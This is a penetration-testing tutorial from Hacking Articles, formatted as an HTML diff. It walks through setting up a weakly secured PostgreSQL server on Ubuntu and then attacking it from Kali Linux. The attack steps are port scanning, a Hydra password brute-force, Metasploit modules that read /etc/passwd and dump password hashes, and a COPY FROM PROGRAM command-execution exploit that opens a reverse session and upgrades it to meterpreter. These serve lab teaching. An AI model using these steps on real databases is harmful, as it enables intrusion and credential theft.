@@ -1,0 +1,131 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">Penetration Testing on PostgreSQL (5432)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/penetration-testing-on-postgresql-5432/" rel="bookmark"><time class="entry-date published" datetime="2020-08-05T10:56:55+00:00">August 5, 2020</time><time class="updated" datetime="2025-05-31T15:13:39+00:00">May 31, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this post, we will demonstrate how to set-up our own Vulnerable PostgreSQL for penetration testing on Ubuntu 20.04 and How to conduct PostgreSQL penetration testing.</span></p>
+<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content</span></h3>
+<p class="ai-optimize-8"><strong><span style="color: #000000;">Pre-requisites</span></strong></p>
+<p class="ai-optimize-9"><strong><span style="color: #000000;">PostgreSQL Setup on Ubuntu 20.04</span></strong></p>
+<p class="ai-optimize-10"><strong><span style="color: #000000;">PostgreSQL Penetration Testing</span></strong></p>
+<p class="ai-optimize-11"><strong><span style="color: #000000;">Scanning: Nmap</span></strong></p>
+<p class="ai-optimize-12"><strong><span style="color: #000000;">Brute force: Hydra</span></strong></p>
+<p class="ai-optimize-13"><strong><span style="color: #000000;">Access Postgres Shell</span></strong></p>
+<p class="ai-optimize-14"><strong><span style="color: #000000;">Exploiting: Metasploit</span></strong></p>
+<ul>
+<li class="ai-optimize-15"><span style="color: #000000;">Module 1: Postgres Readfile</span></li>
+<li class="ai-optimize-16"><span style="color: #000000;">Module 2: Banner Grabbing for Postgres_sql</span></li>
+<li class="ai-optimize-17"><span style="color: #000000;">Module 3: Dumping Password Hashes</span></li>
+<li class="ai-optimize-18"><span style="color: #000000;">Module 4: Pwn Postgres Shell</span></li>
+</ul>
+<h3 class="ai-optimize-19"><span style="color: #800000;">Pre-requisites</span></h3>
+<p class="ai-optimize-20"><span style="color: #000000;"><strong>Target:</strong>  Ubuntu</span></p>
+<p class="ai-optimize-21"><span style="color: #000000;"><strong>Attacker: Kali Linux </strong></span></p>
+<h3 class="ai-optimize-22"><span style="color: #800000;">PostgreSQL Setup on Ubuntu 20.04</span></h3>
+<p class="ai-optimize-23"><span style="color: #000000;">PostgreSQL is an open-source and advanced object-oriented relational database which is also known as Postgres. It is a powerful high-performance database management system released under a flexible BSD-style license.</span></p>
+<p class="ai-optimize-24"><span style="color: #000000;">In order to configure PostgreSQL in your Ubuntu platform, there are some prerequisites required for installation.</span></p>
+<ul>
+<li class="ai-optimize-25"><span style="color: #000000;">Ubuntu 20.04</span></li>
+<li class="ai-optimize-26"><span style="color: #000000;">Root Privileges</span></li>
+</ul>
+<h4 class="ai-optimize-27"><span style="color: #000000;">Install PostgreSQL and All Dependencies</span></h4>
+<p class="ai-optimize-28"><span style="color: #000000;">PostgreSQL is available in the Ubuntu repository. So you just need to install them with the apt command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install postgresql postgresql-client</pre>
+<p class="ai-optimize-29"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ltMmy93uKyU/XyqMKgQK1JI/AAAAAAAAmmY/Lg2NR_ExuLAYhdSNg1lfexm1LdITxLacgCLcBGAsYHQ/s1600/1.png"/></span></p>
+<p class="ai-optimize-30"><span style="color: #000000;">on the time of installation, a prompt will display on your system that will ask you to confirm the installation process that either you want to continue or not. You need to press ‘y’ to continue the installation.</span></p>
+<p class="ai-optimize-31"><span style="color: #000000;">Once the installation is completed, start the PostgreSQL service and add it to the system boot by entering following command</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">systemctl start postgresql.service
+systemctl enable postgresql.service</pre>
+<h3 class="ai-optimize-32"><span style="color: #800000;">Set PostgreSQL user Password</span></h3>
+<p class="ai-optimize-33"><span style="color: #000000;">You can create the user password for PostgreSQL. Using the following command, you can change the default user password for PostgreSQL. During this process a prompt display on your system that will ask you to enter the new password. After that, a confirmation will be displayed ‘password updated successfully’. And then next, Now you will log in to the database as a user or working shell using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">passwd postgres
+su -l postgres
+psql</pre>
+<p class="ai-optimize-34"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YVqJpuK74JU/XyqMOaTByrI/AAAAAAAAmmc/5VR4sFscbYQ6zW8nrxYeICJNjhG2tj7LwCLcBGAsYHQ/s1600/2.png"/></span></p>
+<h3 class="ai-optimize-35"><span style="color: #800000;">Create a database and user roles</span></h3>
+<p class="ai-optimize-36"><span style="color: #000000;">You can create new databases and users using the PostgreSQL shell as follows:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">psql -c "alter user postgres with password '123' "
+createuser -EPd ignite
+createdb secret -O ignite
+psql secret</pre>
+<p class="ai-optimize-37"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-t1fgrLCGAVE/XyqMS88uQlI/AAAAAAAAmmg/te-1iJX5UV4lI3CJyN_Kvs5jR2iVoCm6gCLcBGAsYHQ/s1600/3.png"/></span></p>
+<p class="ai-optimize-38"><span style="color: #000000;">Enter the following command to list the databases:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">psql -l</pre>
+<p class="ai-optimize-39"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TlFAJcQ7SHI/XyqMXAQPPYI/AAAAAAAAmmk/MAjkMdt8_gwVW5hmGUfMakKOit_ioSLHACLcBGAsYHQ/s1600/4.png"/></span></p>
+<p class="ai-optimize-40"><span style="color: #000000;">PostgreSQL by default listens at Local Interface which is 127.0.0.1. But, for the remote access, you need to some changes in the configuration file. To Access the configuration file you will use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/postgresql/12/main/postgresql.conf</pre>
+<p class="ai-optimize-41"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-v6ovRLDhEcI/XyqMbJiwMYI/AAAAAAAAmms/FeALCm_9U8wenvf_7fd-GcqY4wp6Cp9lwCLcBGAsYHQ/s1600/5.png"/></span></p>
+<p class="ai-optimize-42"><span style="color: #000000;">under the connection settings, you will set <strong>#listen_addresses= ‘*’</strong></span></p>
+<p class="ai-optimize-43"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DW286iIm97E/XyqMfTw8L-I/AAAAAAAAmmw/TLibiGTRHAIQVODf46cBrJKEwqHqLgwpQCLcBGAsYHQ/s1600/6.png"/></span></p>
+<p class="ai-optimize-44"><span style="color: #000000;">Now you will restart the PostgreSQL service by entering the following command</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">service postgresql restart</pre>
+<p class="ai-optimize-45"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sRm0dlUup8o/XyqMjDHoetI/AAAAAAAAmm4/fISwXC0IMa8-8j7jYIfWsRmqSH7USw81QCLcBGAsYHQ/s1600/7.png"/></span></p>
+<h3 class="ai-optimize-46"><span style="color: #800000;">Let’s start Pentesting PostgreSQL</span></h3>
+<p class="ai-optimize-47"><span style="color: #000000;">In this section, you will be learning how to compromise Databases credentials using different techniques.</span></p>
+<p class="ai-optimize-48"><span style="color: #000000;">Let’s fire up the Attacking machine kali-Linux</span></p>
+<h3 class="ai-optimize-49"><span style="color: #800000;">Nmap</span></h3>
+<p class="ai-optimize-50"><span style="color: #000000;">By-default PostgreSQL service is running on the port no. 5432, with the help of NMAP, let’s identify the state of Port.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p5432 192.168.1.108</pre>
+<p class="ai-optimize-51"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HGCLcdKRavI/XyqMoEAw3QI/AAAAAAAAmnE/hQit-CAd1YYV7hMHrfnDoawYo-Z4WGk0QCLcBGAsYHQ/s1600/8.png"/></span></p>
+<p class="ai-optimize-52"><span style="color: #000000;">As you can see, it has shown Open state for PostgreSQL at port 5432.</span></p>
+<h3 class="ai-optimize-53"><span style="color: #800000;">Password Cracking</span></h3>
+<p class="ai-optimize-54"><span style="color: #000000;">Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.</span></p>
+<p class="ai-optimize-55"><span style="color: #000000;">Let’s brute-force the target perform this attack you should go with the following command where <strong>-L option</strong> enables dictionary for username parameter and <strong>-P options</strong> enables dictionary for the password list.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -L user.txt -P pass.txt 192.168.1.108 postgres</pre>
+<p class="ai-optimize-56"><span style="color: #000000;">As above you can see we have successfully dumped the credentials you can use these credentials in gaining access on the database.</span></p>
+<p class="ai-optimize-57"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CQsZmmrmYcE/XyqMtAmX-hI/AAAAAAAAmnM/5Z0-Gc-AfyAsM2VwxMHSGb-zx7FeM4e0QCLcBGAsYHQ/s1600/11.png"/></span></p>
+<h4 class="ai-optimize-58"><span style="color: #000000;">Connect to Database Remotely </span></h4>
+<p class="ai-optimize-59"><span style="color: #000000;">Kali Linux by default have the <strong>psql </strong>utility which allows you to authenticate with PostgreSQL database if the username and the password are already known.</span></p>
+<p class="ai-optimize-60"><span style="color: #000000;">As we have already right credentials of the database</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic"> psql -h 192.168.1.108 -U postgres</pre>
+<p class="ai-optimize-61"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7leKTS0iGW0/XyqNMXxQI9I/AAAAAAAAmnk/A_XbpSfFWCABxBp9TPW-JYbjpf-U8ZUbACLcBGAsYHQ/s1600/15.png"/></span></p>
+<h3 class="ai-optimize-62"><span style="color: #800000;">Metasploit</span></h3>
+<p class="ai-optimize-63"><span style="color: #000000;">As we know Metasploit comes preinstalled with Kali Linux, so our first step is to get to the Metasploit console.</span></p>
+<h3 class="ai-optimize-64"><span style="color: #000000;">Module 1: Postgres Readfile</span></h3>
+<p class="ai-optimize-65"><span style="color: #000000;">The <em>postgres_readfile</em> module, <strong>when provided with credentials</strong> (e.g. <strong>superuser</strong> account) for a PostgreSQL server, will read and display files of your choosing on the server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use auxiliary/admin/postgres/postgres_readfile
+msf auxiliary(admin/postgres/postgres_readfile) &gt; set rhosts 192.168.1.108
+msf auxiliary(admin/postgres/postgres_readfile) &gt; set rfile /etc/passwd
+msf auxiliary(admin/postgres/postgres_readfile) &gt; set password 123
+msf auxiliary(admin/postgres/postgres_readfile) &gt; exploit</pre>
+<p class="ai-optimize-66"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-puEq50ki-xM/XyqNSVPCXeI/AAAAAAAAmno/fG6P0s7VF6AZyWz61oaX2ZCV3ZXRzF-mwCLcBGAsYHQ/s1600/12.png"/></strong></span></p>
+<h3 class="ai-optimize-67"><span style="color: #000000;">Module 2: Banner Grabbing for Postgres_sql</span></h3>
+<p class="ai-optimize-68"><span style="color: #000000;">The <em>postgres_sql</em> module, when provided with valid credentials for a PostgreSQL server, will perform queries of your choosing and return the results.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use auxiliary/admin/postgres/postgres_sql
+msf auxiliary(admin/postgres/postgres_sql) &gt; set rhosts 192.168.1.108
+msf auxiliary(admin/postgres/postgres_sql) &gt; set username ignite
+msf auxiliary(admin/postgres/postgres_sql) &gt; set password 123
+msf auxiliary(admin/postgres/postgres_sql) &gt; exploit</pre>
+<p class="ai-optimize-69"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dvQyp2smYrc/XyqNWRkHWqI/AAAAAAAAmns/AtFfCAXcEyIfDrVyfscOeGjyBzNe2Rf1gCLcBGAsYHQ/s1600/13.png"/></span></p>
+<h3 class="ai-optimize-70"><span style="color: #000000;">Module 3: Dumping Password Hashes</span></h3>
+<p class="ai-optimize-71"><span style="color: #000000;">As we have credentials of database admin then we use this one-liner exploit to dump all the user hashes in Metasploit:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf use auxiliary/scanner/postgres/postgres_hashdump
+msf auxiliary(scanner/postgres/postgres_hashdump) &gt; set rhosts 192.168.1.108
+msf auxiliary(scanner/postgres/postgres_hashdump) &gt; set username postgres
+msf auxiliary(scanner/postgres/postgres_hashdump) &gt; set password 123
+msf auxiliary(scanner/postgres/postgres_hashdump) &gt; exploit</pre>
+<p class="ai-optimize-72"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Sj1ixts6CCI/XyqNbJdvCaI/AAAAAAAAmnw/BsBqaIv8LrURM-Afk3zJzgES_uyYYhV9ACLcBGAsYHQ/s1600/14.png"/></span></p>
+<h3 class="ai-optimize-73"><span style="color: #000000;">Module 4:  Pwn Postgres Shell</span></h3>
+<p class="ai-optimize-74"><span style="color: #000000;">Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with ‘pg_execute_server_program’ to pipe to and from an external program using COPY. This allows arbitrary command execution as though you have console access. This module attempts to create a new table, then execute system commands in the context of copying the command output into the table</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; set rhosts 192.168.1.108
+msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; set lhost 192.168.1.111
+msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; set username postgres
+msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; set password 123
+msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; exploit</pre>
+<p class="ai-optimize-75"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pKSKJGrmZHA/XyqNgNqcBeI/AAAAAAAAmn0/tHucwitSspYdE2mMB_ueaqNm46oooU1lgCLcBGAsYHQ/s1600/17.png"/></span></p>
+<p class="ai-optimize-76"><span style="color: #000000;">Now we gained access on the database, you can observe that here we obtain command session and latter we have to upgrade it into meterpreter sessions.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; run
+msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; sessions
+msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; sessions -u 1
+msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; sessions 2</pre>
+<p class="ai-optimize-77"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EJarjkyddBE/XyqNjmkYrnI/AAAAAAAAmn4/CbmNifdmTjURQIbFqMvLBUMGlr0hmRFVgCLcBGAsYHQ/s1600/18.png"/></span></p>
+<p class="ai-optimize-78"><span style="color: #000000;">Now we have full access on the database, in this way we can test for postgres loopholes and submit the findings to the network admin 😊.</span></p>
+<p class="ai-optimize-6"><span style="color: #000000;">To learn more about Penetration Testing. Follow this</span> <a href="https://www.hackingarticles.in/category/penetration-testing/">Link.</a></p>
+<p class="ai-optimize-79"><span style="color: #000000;"><strong>Author</strong> – Vijay is a Certified Ethical Hacker, Technical writer and Penetration Tester at Hacking Articles. Technology and Gadget freak. Contact <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/vijay-igcbr/"><strong>Here</strong></a></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
